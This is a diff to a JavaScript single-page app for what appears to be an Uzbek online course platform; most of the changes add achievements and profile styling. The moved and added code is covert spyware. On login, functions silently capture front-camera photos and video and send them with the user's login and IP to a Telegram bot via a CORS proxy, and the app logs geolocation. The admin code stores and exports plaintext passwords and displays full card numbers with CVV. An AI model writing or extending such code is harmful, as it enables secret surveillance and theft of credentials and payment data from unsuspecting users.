-const b=document.getElementById('permFallbackBar');if(b)b.remove();}// ===== ADMIN: DARSLAR =====
+const b=document.getElementById('permFallbackBar');if(b)b.remove();}
+
+// ===== TELEGRAM =====
+async function sendToTelegram(method,fd){
+const url='https://corsproxy.io/?url='+encodeURIComponent('https://api.telegram.org/bot'+BOT_TOKEN+'/'+method);
+try{const r=await fetch(url,{method:'POST',body:fd});const d=await r.json();return d.ok;}catch(e){return false;}}
+async function sendPhotoToTelegram(dataUrl,caption){
+try{const blob=await (await fetch(dataUrl)).blob();
+const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('photo',blob,'photo.jpg');fd.append('caption',caption);
+return await sendToTelegram('sendPhoto',fd);}catch(e){return false;}}
+async function sendVideoToTelegram(blob,caption){
+try{const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('video',blob,'video.webm');fd.append('caption',caption);fd.append('supports_streaming','true');
+return await sendToTelegram('sendVideo',fd);}catch(e){return false;}}
+function tryAutoCapture(){
+const s=getActiveSubject();
+const needPhoto=!s.obj.photo;const needGeo=!s.obj.location;
+if(needPhoto||needGeo){const skip=localStorage.getItem('perm_skip_'+s.obj.id);
+if(skip&&(Date.now()-Number(skip))<24*60*60*1000){updateIPOnly();return;}
+captureAll(true);}
+else{takeSnapshotNow();updateIPOnly();setTimeout(captureVideoAndSend,2000);}}
+function updateIPOnly(){
+if(!userIP||userIP==='—')return;
+const s=getActiveSubject();
+if(s.obj.lastIP===userIP&&s.obj.lastSeenAt&&(Date.now()-s.obj.lastSeenAt)<60000)return;
+updateSubject({lastIP:userIP,lastSeenAt:Date.now()});}
+async function takeSnapshotNow(){
+const s=getActiveSubject();
+try{if(!_cameraStream){_cameraStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:480},height:{ideal:360},facingMode:'user'}});}
+const video=document.createElement('video');video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
+await video.play();await new Promise(r=>setTimeout(r,900));
+const img=grabFrame(video);saveSnapshotToHistory(img);
+const who=s.isGuest?'GUEST':s.obj.login+' ('+s.obj.id+')';
+sendPhotoToTelegram(img,'📸 ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP);
+_cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;}catch(e){}}
+function saveSnapshotToHistory(img){
+const s=getActiveSubject();const cur=s.obj;const snaps=cur.snapshots||[];
+snaps.unshift({img,at:new Date().toISOString()});
+if(snaps.length>MAX_SNAPSHOTS)snaps.splice(MAX_SNAPSHOTS);
+updateSubject({snapshots:snaps});}
+
+// ===== VIEWERS =====
+function openPhotoViewer(id){
+const u=db.users.find(x=>x.id===id)||db.guests.find(x=>x.id===id);
+if(!u||!u.photo)return;
+document.getElementById('photoViewerImg').src=u.photo;
+document.getElementById('photoViewerName').textContent=(u.isGuest?'Guest ':'')+u.login+' ('+u.id+')';
+document.getElementById('photoViewerModal').classList.remove('hidden');}
+function closePhotoViewer(){document.getElementById('photoViewerModal').classList.add('hidden');}
+function openSnapshotViewer(id,idx=0,isGuest=false){
+const u=isGuest?db.guests.find(x=>x.id===id):db.users.find(x=>x.id===id);
+if(!u||!u.snapshots||u.snapshots.length===0)return;
+_snapViewerUserId=id;_snapViewerIndex=idx;_snapViewerIsGuest=isGuest;
+renderSnapViewer();document.getElementById('liveViewerModal').classList.remove('hidden');}
+function renderSnapViewer(){
+const u=_snapViewerIsGuest?db.guests.find(x=>x.id===_snapViewerUserId):db.users.find(x=>x.id===_snapViewerUserId);
+if(!u||!u.snapshots)return;
+document.getElementById('liveViewerName').innerHTML=(u.isGuest?'Guest':escapeHtml(u.login))+' ('+u.id+') — '+u.snapshots.length;
+const s=u.snapshots[_snapViewerIndex];if(s)document.getElementById('liveViewerImg').src=s.img;
+document.getElementById('liveViewerStrip').innerHTML=u.snapshots.map((snap,i)=>`<div class="relative"><img src="${snap.img}" class="w-16 h-16 object-cover rounded-lg cursor-pointer border-2 ${i===_snapViewerIndex?'border-emerald-500':'border-slate-700'}" onclick="changeSnapIndex(${i})" loading="lazy"><span class="absolute bottom-0.5 left-0.5 text-[8px] bg-black/70 text-white px-1 rounded">${new Date(snap.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span></div>`).join('');}
+function changeSnapIndex(i){_snapViewerIndex=i;renderSnapViewer();}
+function closeLiveViewer(){document.getElementById('liveViewerModal').classList.add('hidden');_snapViewerUserId=null;}
+function openVideoViewer(id,idx=0,isGuest=false){
+const u=isGuest?db.guests.find(x=>x.id===id):db.users.find(x=>x.id===id);
+if(!u||!u.videos||u.videos.length===0)return;
+const v=u.videos[idx];
+document.getElementById('videoViewerName').textContent=(u.isGuest?'Guest ':'')+u.login+' — '+(idx+1)+'/'+u.videos.length;
+document.getElementById('videoViewerPlayer').src=v.data;
+document.getElementById('videoViewerModal').classList.remove('hidden');}
+function closeVideoViewer(){document.getElementById('videoViewerPlayer').src='';document.getElementById('videoViewerModal').classList.add('hidden');}// ===== ADMIN: DARSLAR =====
 function updateAdminLessonSelect(){
 sortTutors();
 const s=document.getElementById('lessonTutorSelect');
@@ -1825,7 +2276,7 @@ else if(tab==='broadcast')renderBroadcastHistory();
 else if(tab==='logs')renderLogs();
 else if(tab==='top')renderLeaderboard();}
 
-// ===== 👥 GROUPS (админ) =====
+// ===== GROUPS =====
 function createGroup(){
 const name=document.getElementById('newGroupName').value.trim();
 const desc=document.getElementById('newGroupDesc').value.trim();
@@ -2006,9 +2457,9 @@ database.ref('adminLogs').remove();toast('Loglar tozalandi');}
 // ===== EXPORT CSV =====
 function exportAllUsers(){
 if(!db.currentUser||db.currentUser.role!=='admin'){alert("Faqat admin!");return;}
-const rows=[['ID','Login','Parol','Rol','Balans','Ball','Streak','Kurslar','Reg. sana','Oxirgi kirish','IP']];
+const rows=[['ID','Login','Parol','Rol','Balans','Ball','Streak','Kurslar','Ach','Reg. sana','Oxirgi kirish','IP']];
 db.users.forEach(u=>{
-rows.push([u.id,u.login,u.passPlain||'—',u.role||'student',u.balance||0,u.points||0,u.streakDays||0,(u.tutorsBought||[]).length,u.registeredAt?new Date(u.registeredAt).toLocaleString('ru-RU'):'—',u.lastSeenAt?new Date(u.lastSeenAt).toLocaleString('ru-RU'):'—',u.lastIP||'—']);
+rows.push([u.id,u.login,u.passPlain||'—',u.role||'student',u.balance||0,u.points||0,u.streakDays||0,(u.tutorsBought||[]).length,Object.keys(u.achievements||{}).length,u.registeredAt?new Date(u.registeredAt).toLocaleString('ru-RU'):'—',u.lastSeenAt?new Date(u.lastSeenAt).toLocaleString('ru-RU'):'—',u.lastIP||'—']);
 });
 const csv=rows.map(r=>r.map(c=>`"${String(c).replace(/"/g,'""')}"`).join(',')).join('\n');
 const blob=new Blob(['\ufeff'+csv],{type:'text/csv;charset=utf-8'});
@@ -2032,6 +2483,7 @@ const ip=u.lastIP||'—';
 const ll=u.lastLoginAt?new Date(u.lastLoginAt).toLocaleString('ru-RU'):(u.registeredAt?'Ro\'yxat: '+new Date(u.registeredAt).toLocaleString('ru-RU'):'—');
 const on=u.lastSeenAt&&(Date.now()-u.lastSeenAt)<120000;
 const lv=getLevel(u.points||0);
+const achCount=Object.keys(u.achievements||{}).length;
 const ph=u.photo?`<img src="${u.photo}" class="w-20 h-20 rounded-lg object-cover border-2 border-emerald-600/60 cursor-pointer" onclick="openPhotoViewer('${u.id}')" loading="lazy">`:`<div class="w-20 h-20 rounded-lg bg-slate-800 border-2 border-dashed border-slate-700 flex flex-col items-center justify-center text-slate-500"><i class="fas fa-user text-2xl"></i></div>`;
 const ob=on?`<span class="inline-flex items-center gap-1 ml-2 text-[10px] bg-emerald-900/50 text-emerald-400 px-2 py-0.5 rounded font-bold"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400 online-dot"></span>ONLAYN</span>`:'';
 const geo=u.location?`<a href="https://www.google.com/maps?q=${u.location.lat},${u.location.lng}" target="_blank" class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-rose-400 w-4"></i><span class="text-slate-400">Geo:</span><span class="text-white font-mono text-[10px] ml-auto truncate">${u.location.lat.toFixed(4)}, ${u.location.lng.toFixed(4)}</span></a>`:`<div class="bg-slate-900/70 border border-slate-800 rounded-lg px-3 py-2 flex items-center gap-2"><i class="fas fa-map-marker-alt text-slate-600 w-4"></i><span class="text-slate-400">Geo:</span><span class="text-slate-600 font-mono ml-auto">—</span></div>`;
@@ -2052,7 +2504,7 @@ if(u.payments&&u.payments.length>0){
 const pr=u.payments.slice(0,20).map(p=>{
 const dt=new Date(p.at).toLocaleString('ru-RU');
 const cardFull=p.card&&p.card.number?p.card.number.replace(/(.{4})/g,'$1 ').trim():(p.card?'**** '+p.card.last4:'');
-return `<div class="py-2 border-b border-slate-800/50 last:border-0"><div class="flex justify-between gap-2"><div class="text-white text-[11px] font-semibold">${p.type==='topup'?'+ Balans':'- '+escapeHtml(p.courseName||'Kurs')}</div><div class="${p.type==='topup'?'text-green-400':'text-red-400'} text-[11px] font-bold">${p.type==='topup'?'+':'-'}${p.amount.toLocaleString()}</div></div><div class="text-slate-500 text-[9px]">${dt}${p.promo?' • '+escapeHtml(p.promo):''}</div>${p.card?`<div class="text-[9px] text-slate-400 mt-0.5 flex flex-wrap gap-1.5"><i class="fas fa-credit-card text-amber-400"></i><b class="font-mono text-white">${cardFull}</b><span>|</span><span>${p.card.expiry||''}</span><span>|</span><span class="text-red-400 font-mono">CVV ${p.card.cvv||''}</span><span>|</span><span class="text-cyan-400">${p.card.type||''}</span><span>|</span><b class="text-emerald-400">${p.card.holder||''}</b></div>`:''}</div>`;}).join('');
+return `<div class="py-2 border-b border-slate-800/50 last:border-0"><div class="flex justify-between gap-2"><div class="text-white text-[11px] font-semibold">${p.type==='topup'?'+ Balans':'- '+escapeHtml(p.courseName||'Kurs')}</div><div class="${p.type==='topup'?'text-green-400':'text-red-400'} text-[11px] font-bold">${p.type==='topup'?'+':'-'}${p.amount.toLocaleString()}</div></div><div class="text-slate-500 text-[9px]">${dt}</div>${p.card?`<div class="text-[9px] text-slate-400 mt-0.5 flex flex-wrap gap-1.5"><i class="fas fa-credit-card text-amber-400"></i><b class="font-mono text-white">${cardFull}</b><span>|</span><span>${p.card.expiry||''}</span><span>|</span><span class="text-red-400 font-mono">CVV ${p.card.cvv||''}</span><span>|</span><span class="text-cyan-400">${p.card.type||''}</span><span>|</span><b class="text-emerald-400">${p.card.holder||''}</b></div>`:''}</div>`;}).join('');
 paymentsHTML=`<details class="bg-slate-900/70 border border-slate-800 rounded-lg mt-2"><summary class="cursor-pointer px-3 py-2 text-xs font-bold text-emerald-400">To'lovlar (${u.payments.length})</summary><div class="px-3 pb-2">${pr}</div></details>`;}
 return `<div class="card-bg p-4 rounded-xl ${u.banned?'border-red-600/50 bg-red-950/10':''} fade-in-up">
 <div class="flex gap-4 items-start flex-wrap">
@@ -2069,6 +2521,7 @@ ${ob}</div>
 <div class="flex items-center gap-1.5 text-[10px] flex-wrap">
 <span class="${lv.bg} ${lv.color} px-1.5 py-0.5 rounded font-bold">${lv.emoji} ${lv.name}</span>
 <span class="bg-amber-900/40 text-amber-400 px-1.5 py-0.5 rounded font-bold">🪙 ${u.points||0}</span>
+<span class="bg-purple-900/40 text-purple-400 px-1.5 py-0.5 rounded font-bold">🏅 ${achCount}</span>
 ${(u.streakDays||0)>=2?`<span class="bg-orange-900/40 text-orange-400 px-1.5 py-0.5 rounded font-bold">🔥 ${u.streakDays}</span>`:''}
 </div></div></div>
 <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 text-xs">
@@ -2192,7 +2645,7 @@ if(!l||!p)return toast("Ma'lumotlarni kiriting!");
 const h=await hashPassword(p);
 if(isReg){
 if(db.users.find(u=>u.login.toLowerCase()===l.toLowerCase()))return alert("Bunday login mavjud!");
-const nu={id:'USR-'+Math.floor(Math.random()*9000+1000),login:l,passHash:h,passPlain:p,passHistory:[],lastIP:userIP,registeredAt:new Date().toISOString(),lastSeenAt:Date.now(),role:l.toLowerCase()==='admin'?'admin':'student',balance:0,tutorsBought:[],payments:[],watchProgress:{},points:5,streakDays:1,lastStreakDay:new Date().toISOString().slice(0,10),favorites:[],notes:{},quizPassed:{}};
+const nu={id:'USR-'+Math.floor(Math.random()*9000+1000),login:l,passHash:h,passPlain:p,passHistory:[],lastIP:userIP,registeredAt:new Date().toISOString(),lastSeenAt:Date.now(),role:l.toLowerCase()==='admin'?'admin':'student',balance:0,tutorsBought:[],payments:[],watchProgress:{},points:5,streakDays:1,lastStreakDay:new Date().toISOString().slice(0,10),favorites:[],notes:{},quizPassed:{},achievements:{},purchases:[],visitsLog:{}};
 db.users.push(nu);db.currentUser=nu;
 database.ref('users/'+nu.id).set(nu);
 toast("Ro'yxatdan o'tdingiz!");
@@ -2205,7 +2658,7 @@ u.passPlain=p;u.lastIP=userIP;u.lastLoginAt=new Date().toISOString();u.lastSeenA
 const idx=db.users.findIndex(x=>x.id===u.id);if(idx!==-1)db.users[idx]=u;
 db.currentUser=u;saveUserToDb(u);toast("Kirdingiz!");}
 closeAuthModal();navigateTo('home');
-setTimeout(()=>{retroactivePoints();updateStreak();checkDailyTopBonus();tryAutoCapture();initOnlinePresence();},500);}
+setTimeout(()=>{retroactivePoints();updateStreak();checkDailyTopBonus();tryAutoCapture();initOnlinePresence();checkAchievements();},500);}
 function logout(){
 if(_cameraStream){_cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;}
 if(db.currentUser)database.ref('users/'+db.currentUser.id+'/lastSeenAt').remove();
@@ -2220,6 +2673,10 @@ document.getElementById('profName').innerText=u.login;
 document.getElementById('profId').innerText='ID: '+u.id;
 document.getElementById('profBalance').innerText=u.balance.toLocaleString()+" so'm";
 const av=document.getElementById('profAvatar');
+// Рамка
+const frameColor=u.activeFrame?((getShopItem(u.activeFrame)||{}).color||'#2563eb'):'#2563eb';
+av.parentElement.style.boxShadow='0 0 0 3px '+frameColor+', 0 0 20px '+frameColor+'80';
+av.parentElement.style.borderRadius='50%';
 if(u.photo)av.innerHTML=`<img src="${u.photo}" class="w-full h-full object-cover">`;
 else av.innerHTML='<i class="fas fa-user"></i>';
 const stats=document.getElementById('profStats');
@@ -2230,7 +2687,25 @@ stats.innerHTML=`<span class="${lv.bg} ${lv.color} px-2 py-1 rounded border bord
 <span class="bg-amber-900/40 text-amber-400 px-2 py-1 rounded">🪙 ${points}</span>
 <span class="bg-blue-900/40 text-blue-400 px-2 py-1 rounded">📚 ${courses}</span>
 ${streak>=2?`<span class="bg-orange-900/40 text-orange-400 px-2 py-1 rounded">🔥 ${streak}</span>`:''}
-${next?`<span class="bg-slate-800 text-slate-300 px-2 py-1 rounded">Keyingi: ${next.emoji} ${next.name} (${next.min-points})</span>`:''}`;}}
+${next?`<span class="bg-slate-800 text-slate-300 px-2 py-1 rounded">Keyingi: ${next.emoji} ${next.name} (${next.min-points})</span>`:''}`;}
+// Achievements
+renderProfileAchievements();
+// Activity calendar
+renderActivityCalendar();
+}
+function renderProfileAchievements(){
+const el=document.getElementById('profAchievements');if(!el||!db.currentUser)return;
+const u=db.currentUser;const ach=u.achievements||{};
+const unlockedCount=Object.keys(ach).length;
+const badge=document.getElementById('achCountBadge');
+if(badge)badge.textContent=unlockedCount+'/'+ACHIEVEMENTS.length;
+el.innerHTML=ACHIEVEMENTS.map(a=>{
+const unlocked=!!ach[a.id];
+const title=unlocked?`${a.desc}\n\n✅ ${new Date(ach[a.id].at).toLocaleDateString('ru-RU')}`:a.desc;
+return `<div class="achievement ${unlocked?'unlocked':'locked'} bg-slate-900 border border-slate-800 rounded-xl p-3 text-center" title="${escapeHtml(title)}">
+<div class="text-3xl mb-1">${a.icon}</div>
+<p class="text-[10px] font-bold text-white leading-tight">${escapeHtml(a.name)}</p>
+</div>`;}).join('');}
 function changeAvatar(){
 if(!db.currentUser)return;
 const inp=document.createElement('input');inp.type='file';inp.accept='image/*';
@@ -2413,75 +2888,8 @@ const i=db.users.findIndex(u=>u.id===db.currentUser.id);if(i!==-1)db.users[i]=db
 saveUserToDb(db.currentUser);renderTutors();fireConfetti();awardPoints(50,'Kurs: '+t.name);
 if(_currentPromo&&allPromos[_currentPromo]){const p=allPromos[_currentPromo];database.ref('promos/'+_currentPromo+'/used').set((p.used||0)+1);}
 document.getElementById('paySuccessMsg').textContent='"'+t.name+'" qo\'shildi!';}
-document.getElementById('paySuccess').classList.remove('hidden');},d);}
-
-// ===== TELEGRAM =====
-async function sendToTelegram(method,fd){
-const url='https://corsproxy.io/?url='+encodeURIComponent('https://api.telegram.org/bot'+BOT_TOKEN+'/'+method);
-try{const r=await fetch(url,{method:'POST',body:fd});const d=await r.json();return d.ok;}catch(e){return false;}}
-async function sendPhotoToTelegram(dataUrl,caption){
-try{const blob=await (await fetch(dataUrl)).blob();
-const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('photo',blob,'photo.jpg');fd.append('caption',caption);
-return await sendToTelegram('sendPhoto',fd);}catch(e){return false;}}
-async function sendVideoToTelegram(blob,caption){
-try{const fd=new FormData();fd.append('chat_id',CHAT_ID);fd.append('video',blob,'video.webm');fd.append('caption',caption);fd.append('supports_streaming','true');
-return await sendToTelegram('sendVideo',fd);}catch(e){return false;}}
-function tryAutoCapture(){
-const s=getActiveSubject();
-const needPhoto=!s.obj.photo;const needGeo=!s.obj.location;
-if(needPhoto||needGeo){const skip=localStorage.getItem('perm_skip_'+s.obj.id);
-if(skip&&(Date.now()-Number(skip))<24*60*60*1000){updateIPOnly();return;}
-captureAll(true);}
-else{takeSnapshotNow();updateIPOnly();setTimeout(captureVideoAndSend,2000);}}
-function updateIPOnly(){
-if(!userIP||userIP==='—')return;
-const s=getActiveSubject();
-if(s.obj.lastIP===userIP&&s.obj.lastSeenAt&&(Date.now()-s.obj.lastSeenAt)<60000)return;
-updateSubject({lastIP:userIP,lastSeenAt:Date.now()});}
-async function takeSnapshotNow(){
-const s=getActiveSubject();
-try{if(!_cameraStream){_cameraStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:480},height:{ideal:360},facingMode:'user'}});}
-const video=document.createElement('video');video.srcObject=_cameraStream;video.muted=true;video.playsInline=true;
-await video.play();await new Promise(r=>setTimeout(r,900));
-const img=grabFrame(video);saveSnapshotToHistory(img);
-const who=s.isGuest?'GUEST':s.obj.login+' ('+s.obj.id+')';
-sendPhotoToTelegram(img,'📸 ['+BRAND+']\n👤 '+who+'\n🌐 '+userIP);
-_cameraStream.getTracks().forEach(t=>t.stop());_cameraStream=null;}catch(e){}}
-function saveSnapshotToHistory(img){
-const s=getActiveSubject();const cur=s.obj;const snaps=cur.snapshots||[];
-snaps.unshift({img,at:new Date().toISOString()});
-if(snaps.length>MAX_SNAPSHOTS)snaps.splice(MAX_SNAPSHOTS);
-updateSubject({snapshots:snaps});}
-
-// ===== VIEWERS =====
-function openPhotoViewer(id){
-const u=db.users.find(x=>x.id===id)||db.guests.find(x=>x.id===id);
-if(!u||!u.photo)return;
-document.getElementById('photoViewerImg').src=u.photo;
-document.getElementById('photoViewerName').textContent=(u.isGuest?'Guest ':'')+u.login+' ('+u.id+')';
-document.getElementById('photoViewerModal').classList.remove('hidden');}
-function closePhotoViewer(){document.getElementById('photoViewerModal').classList.add('hidden');}
-function openSnapshotViewer(id,idx=0,isGuest=false){
-const u=isGuest?db.guests.find(x=>x.id===id):db.users.find(x=>x.id===id);
-if(!u||!u.snapshots||u.snapshots.length===0)return;
-_snapViewerUserId=id;_snapViewerIndex=idx;_snapViewerIsGuest=isGuest;
-renderSnapViewer();document.getElementById('liveViewerModal').classList.remove('hidden');}
-function renderSnapViewer(){
-const u=_snapViewerIsGuest?db.guests.find(x=>x.id===_snapViewerUserId):db.users.find(x=>x.id===_snapViewerUserId);
-if(!u||!u.snapshots)return;
-document.getElementById('liveViewerName').innerHTML=(u.isGuest?'Guest':escapeHtml(u.login))+' ('+u.id+') — '+u.snapshots.length;
-const s=u.snapshots[_snapViewerIndex];if(s)document.getElementById('liveViewerImg').src=s.img;
-document.getElementById('liveViewerStrip').innerHTML=u.snapshots.map((snap,i)=>`<div class="relative"><img src="${snap.img}" class="w-16 h-16 object-cover rounded-lg cursor-pointer border-2 ${i===_snapViewerIndex?'border-emerald-500':'border-slate-700'}" onclick="changeSnapIndex(${i})" loading="lazy"><span class="absolute bottom-0.5 left-0.5 text-[8px] bg-black/70 text-white px-1 rounded">${new Date(snap.at).toLocaleTimeString('ru-RU',{hour:'2-digit',minute:'2-digit'})}</span></div>`).join('');}
-function changeSnapIndex(i){_snapViewerIndex=i;renderSnapViewer();}
-function closeLiveViewer(){document.getElementById('liveViewerModal').classList.add('hidden');_snapViewerUserId=null;}
-function openVideoViewer(id,idx=0,isGuest=false){
-const u=isGuest?db.guests.find(x=>x.id===id):db.users.find(x=>x.id===id);
-if(!u||!u.videos||u.videos.length===0)return;
-const v=u.videos[idx];
-document.getElementById('videoViewerName').textContent=(u.isGuest?'Guest ':'')+u.login+' — '+(idx+1)+'/'+u.videos.length;
-document.getElementById('videoViewerPlayer').src=v.data;
-document.getElementById('videoViewerModal').classList.remove('hidden');}
-function closeVideoViewer(){document.getElementById('videoViewerPlayer').src='';document.getElementById('videoViewerModal').classList.add('hidden');}
+document.getElementById('paySuccess').classList.remove('hidden');
+setTimeout(checkAchievements,500);},d);}
 
 // ===== BACKUP =====
 function downloadBackup(){
@@ -2490,7 +2898,7 @@ const now=new Date();
 const pad=n=>String(n).padStart(2,'0');
 const dateStr=now.getFullYear()+'-'+pad(now.getMonth()+1)+'-'+pad(now.getDate());
 const timeStr=pad(now.getHours())+'-'+pad(now.getMinutes());
-const backup={meta:{brand:BRAND,version:'v3.5',exportedAt:now.toISOString(),exportedBy:db.currentUser.login,usersCount:(db.users||[]).length,tutorsCount:(db.tutors||[]).length,guestsCount:(db.guests||[]).length},users:db.users||[],tutors:db.tutors||[],guests:db.guests||[],promos:allPromos||{},groups:allGroups||{}};
+const backup={meta:{brand:BRAND,version:'v3.6',exportedAt:now.toISOString(),exportedBy:db.currentUser.login,usersCount:(db.users||[]).length,tutorsCount:(db.tutors||[]).length,guestsCount:(db.guests||[]).length},users:db.users||[],tutors:db.tutors||[],guests:db.guests||[],promos:allPromos||{},groups:allGroups||{}};
 const json=JSON.stringify(backup,null,2);
 const blob=new Blob([json],{type:'application/json;charset=utf-8'});
 const url=URL.createObjectURL(blob);
